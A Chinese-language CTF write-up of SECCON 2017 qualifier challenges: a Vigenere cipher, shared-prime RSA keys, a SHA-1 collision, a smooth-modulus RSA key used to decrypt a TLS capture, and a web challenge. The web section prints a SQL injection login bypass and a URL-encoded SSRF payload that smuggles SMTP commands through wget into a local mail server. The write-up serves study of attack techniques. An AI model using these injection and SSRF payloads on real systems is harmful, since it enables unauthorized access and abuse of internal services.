# SECCON CTF quals 2017

## Vigenere3d

就是 Vigenere cipher 而且 key 是回文

隨便寫個 script 就解出來了 ([solve.py](Vigenere3d/solve.py))

flag : SECCON{Welc0me_to_SECCON_CTF_2017}

## Ps-and-Qs

給兩把 public key

有共同質數 gcd 一下就解出來了 ([solve.py](Ps-and-Qs/solve.py))

flag : SECCON{1234567890ABCDEF}

## SHA-1-is-dead

SHA1 collision 但是要求兩個檔案的大小要介於 2017KiB ~ 2018KiB

那就把 google 的那兩個檔案拿來後面隨便接一些一樣的字串讓大小夠就好了

flag : SECCON{SHA-1_1995-2017?}

## SqlSRF

> The root reply the flag to your mail address if you send a mail that subject is "give me flag" to root.
> http://sqlsrf.pwn.seccon.jp/sqlsrf/

我們可以看到 index.cgi 的原始碼

這行有 sql injection `"SELECT password FROM users WHERE username='".$q->param('user')."';"`

看原始碼也可以知道他是用 sqlite

他會把 select 出來的東西跟 encrypt(param['pass']) 比較，一樣就可以登入了

另外，如果句選 Remember Me 的話，他會幫你把 encrypt(param['user']) 存在 cookie 裡面，然後幫你解密放在 user 的 input box ( 我們可以加解密任意字串 )

所以先得到 encrypt('oalieno') = '6102b0591250cea64f303ec4a9c6425f'

user 放 `' union select '6102b0591250cea64f303ec4a9c6425f' -- `

pass 放 `oalieno`

就可以順利登入了

![](https://i.imgur.com/EQqOS9M.png)

在 menu.cgi 我們可以按 `netstat -tnl` 但是不能用 `wget --debug -O /dev/stdout 'http://{}'` ( 需要 admin )

![](https://i.imgur.com/9q6DY8Q.png)

所以我們回過頭來用 sql blind injection 取得 admin 的密碼 ([solve.py](SqlSRF/solve.py))

密碼是 encrypt 過的 ( 長度 32 ) 同樣用 Remember Me 解密

admin password = decrypt(d2f37e101c0e76bcc90b5634a5510f64) = 'Yes!Kusomon!!'

成功用 admin 登入後就可以用 wget 發 request

剛剛用 netstat 可以看到 `127.0.0.1:25` 這台 local 的 SMTP server

直接 wget `127.0.0.1:25` 的話可以看到 SMTP server 會把我們的 http request 的每一行都當成 SMTP 的指令來看

![](https://i.imgur.com/a0Mdg7W.png)

那我們就用 `%0d%0a` 來下 SMTP 指令寄信給 `root`

```
127.0.0.1
HELO oalieno
MAIL From: <xxx@gmail.com>
RCPT To: <root>
DATA
Subject: give me flag
oalieno
.
:25/
```

把上面的東東做 urlencode 就可以了

final payload : `127.0.0.1%0D%0AHELO%20oalieno%0D%0AMAIL%20From%3A%20%3Cxxx%40gmail.com%3E%0D%0ARCPT%20To%3A%20%3Croot%3E%0D%0ADATA%0D%0ASubject%3A%20give%20me%20flag%0D%0Aoalieno%0D%0A.%0D%0A:25/`

然後就收到信了XD

![](https://i.imgur.com/OEwnXKM.png)

但是 flag 也被 encrypt 過，那就同樣用 Remember Me 解密

flag : SECCON{SSRFisMyFriend!}

## Very Smooth

[some ctf writeups](https://ctf.rip/bsides-sf-ctf-2017-root-crypto-challenge/)

[extract certificate from pcap](https://security.stackexchange.com/questions/123851/how-can-i-extract-the-certificate-from-this-pcap-file)

參考上面兩篇把 憑證 取出來存成 `certificate.der`

`openssl x509 -inform der -pubkey -noout -in certificate.cer > pub.pem` 再轉成 pem 格式的 public key

再來就是來分解 N 了 ( N 是 1024 bit )

首先用 `./RsaCtfTool.py --publickey public.pem --verbose --private` 但解不開 ( factordb 可以分解 O_O 不過應該是賽後有人把他傳上去了因為我是賽後才解這題的 )

但是題目有提示 smooth 也就是 smooth number 也就是質因數很多的 number

那我就用 Pollard p-1 就直接解出來了 O_O ( 看 writeups 好像大家都用 Williams p+1 還沒看懂他 Orz )

解出來之後輸出成 pem 格式的 private key

![](https://i.imgur.com/x3tDP65.png)

Edit>Preference Protocol>SSL>Edit RSA keys list 把 private.pem 匯入

然後 follow SSL stream 就大功告成

![](https://i.imgur.com/yLT7EL0.png)

flag : SECCON{One of these primes is very smooth.}
